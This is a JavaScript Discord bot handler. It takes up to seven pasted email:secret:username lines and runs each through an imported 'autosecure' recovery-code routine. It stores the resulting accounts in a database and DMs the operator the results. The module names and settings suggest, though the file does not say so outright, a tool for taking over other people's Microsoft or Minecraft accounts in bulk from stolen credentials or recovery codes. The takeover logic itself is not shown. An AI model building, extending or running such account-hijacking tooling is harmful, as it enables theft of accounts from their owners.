const secure = require('../../../autosecure/utils/secure/recodesecure');
const generateuid = require('../../../autosecure/utils/generateuid');
const listAccount = require('../../../autosecure/utils/accounts/listAccount');
const insertaccount = require('../../../db/insertaccount');
const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const { queryParams } = require('../../../db/database');

module.exports = async (client, interaction) => {
  if (!interaction.isModalSubmit()) return;
  if (interaction.customId !== 'bulk_secure') return;

  await interaction.deferReply({ ephemeral: true });

  const raw = interaction.fields.getTextInputValue('bulkdata');
  const lines = raw.split('\n').map(l => l.trim()).filter(Boolean);

  if (lines.length === 0) {
    return interaction.editReply('No accounts provided.');
  }

  if (lines.length > 7) {
    return interaction.editReply('You can only secure **7 accounts at a time**.');
  }

  const settingsRows = await queryParams(
    'SELECT * FROM secureconfig WHERE user_id=?',
    [interaction.user.id]
  );

  if (!settingsRows.length) {
    return interaction.editReply('Secure configuration not found.');
  }

  const settings = settingsRows[0];

  await interaction.editReply(`🔐 Securing **${lines.length}** accounts...`);

  for (const line of lines) {
    try {
      const parts = line.split(':');
      const email = parts[0];
      const secret = parts[1];
      const username = parts[2] || null;

      if (!email || !secret) continue;

      const uid = await generateuid();

      // Status embed (same as single)
      const embed = new EmbedBuilder()
        .setTitle('This account is being automatically secured.')
        .setColor(0x808080);

      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setCustomId(`status|${uid}`)
          .setLabel('⏳ Status')
          .setStyle(ButtonStyle.Primary)
      );

      await interaction.user.send({ embeds: [embed], components: [row] });

      const acc = await secure(secret, settings, uid, username);
      await insertaccount(acc, uid, interaction.user.id, settings.secureifnomc);

      const accountMsg = await listAccount(acc, uid, client, interaction);
      await interaction.user.send(accountMsg);

    } catch (err) {
      console.error('[BULK SECURE Vortex]', err);
      await interaction.user.send('❌ Failed securing one account.');
    }
  }

  await interaction.editReply('✅ Bulk secure finished. Check your DMs.');
};
